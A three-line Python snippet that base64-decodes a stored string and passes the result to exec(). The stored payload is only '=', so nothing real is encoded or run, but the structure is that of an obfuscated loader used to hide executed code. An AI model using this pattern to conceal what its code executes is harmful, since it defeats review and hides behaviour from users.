import base64
script_b64 = b'='
exec(base64.b64decode(script_b64).decode('utf-8'))
